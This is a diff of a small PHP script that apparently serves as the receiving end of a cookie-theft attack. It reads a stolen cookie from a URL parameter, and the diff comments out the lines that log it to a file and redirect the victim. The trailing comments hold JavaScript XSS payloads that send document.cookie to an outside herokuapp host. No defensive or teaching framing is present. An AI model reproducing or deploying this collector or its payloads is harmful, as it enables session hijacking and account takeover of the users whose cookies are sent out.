@@ -4,10 +4,10 @@ include 'PHPMailer/class.phpmailer.php';
 
 if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
-    $f = open("log.txt", "a");
-    $t = date("Y-m-d",time());
-    fwrite( $f, $t.":\n".$cookie."\n\n");
-    header('Location: http://matxac.com/');
+//     $f = open("log.txt", "a");
+//     $t = date("Y-m-d",time());
+//     fwrite( $f, $t.":\n".$cookie."\n\n");
+//     header('Location: http://matxac.com/');
     
 //     $sessionid = "";
 //     $user = "";
@@ -42,7 +42,7 @@ if (isset($_GET["abc"])) {
     
 //     $mail->Send();
     
-//     echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';
+    echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';
 
 //document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
 //var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("[style="display:none;"]").appendChild(elem);
